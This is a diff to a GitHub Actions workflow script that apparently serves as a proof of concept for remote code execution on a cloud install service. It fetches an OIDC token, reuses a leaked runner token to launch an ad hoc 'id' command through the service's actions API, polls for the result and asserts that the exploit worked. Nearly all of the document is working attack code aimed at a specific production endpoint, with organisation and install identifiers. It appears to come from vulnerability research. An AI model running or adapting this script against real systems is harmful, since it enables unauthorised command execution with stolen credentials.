@@ -14,7 +14,7 @@ jobs:
           set -euo pipefail
           org='orgl9cvkaqh1g8yv2jqdb19247'
           azure_install='inl0hbh50qbe3p8dno3kiyb7j0'
-          execution_install='inlkuvvc4e3mdxznfis5xc6v60'
+          execution_install="$azure_install"
 
           raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
           export REAL_TOKEN="$(jq -r .value <<<"$raw")"
@@ -59,9 +59,10 @@ jobs:
           marker="installer-readonly-rce-${GITHUB_RUN_ID}"
           action="$(jq -nc --arg marker "$marker" --arg req "$GITHUB_RUN_ID" '{command:("echo "+$marker+" && id"),timeout:60,name:"installer-readonly-rce",request_id:("installer-readonly-rce-"+$req),enable_kube_config:false}' | curl -sSf -X POST "https://api.byoc.lovable.net/v1/installs/$execution_install/actions/adhoc-run" -H "Authorization: Bearer $leaked_token" -H "X-Nuon-Org-ID: $org" -H 'Content-Type: application/json' --data-binary @-)"
           action_id="$(jq -r .id <<<"$action")"
-          for unused in $(seq 1 45); do
+          for unused in $(seq 1 60); do
             status="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$execution_install/actions/runs/$action_id" -H "Authorization: Bearer $leaked_token" -H "X-Nuon-Org-ID: $org")"
-            test "$(jq -r .status <<<"$status")" = finished && break
+            state="$(jq -r .status <<<"$status")"
+            { test "$state" = finished || test "$state" = error; } && break
             sleep 2
           done
           job_id="$(jq -r '.runner_job.id' <<<"$status")"
@@ -79,6 +80,9 @@ jobs:
             --arg leaked_org_permission "$(jq -r --arg org "$org" '.permissions[$org]' <<<"$leaked_me")" \
             --arg action_id "$action_id" \
             --arg action_status "$(jq -r .status <<<"$status")" \
+            --arg action_status_description "$(jq -r .status_description <<<"$status")" \
             --argjson readonly_permissions "$(jq .permissions <<<"$readonly_me")" \
             --argjson command_output "$proof" \
-            '{setup_only_existing_issue:$setup_role,readonly_account_type:$readonly_account_type,readonly_permissions:$readonly_permissions,direct_action_http_status:$direct_action_http_status,installer_http_method:$installer_http_method,installer_contains_runner_token:($installer_contains_runner_token=="true"),leaked_account_type:$leaked_account_type,leaked_role_type:$leaked_role_type,leaked_org_permission:$leaked_org_permission,action_id:$action_id,action_status:$action_status,command_output:$command_output}'
+            '{setup_only_existing_issue:$setup_role,readonly_account_type:$readonly_account_type,readonly_permissions:$readonly_permissions,direct_action_http_status:$direct_action_http_status,installer_http_method:$installer_http_method,installer_contains_runner_token:($installer_contains_runner_token=="true"),leaked_account_type:$leaked_account_type,leaked_role_type:$leaked_role_type,leaked_org_permission:$leaked_org_permission,action_id:$action_id,action_status:$action_status,action_status_description:$action_status_description,command_output:$command_output}'
+          test "$(jq -r .status <<<"$status")" = finished
+          test "$(jq length <<<"$proof")" = 2
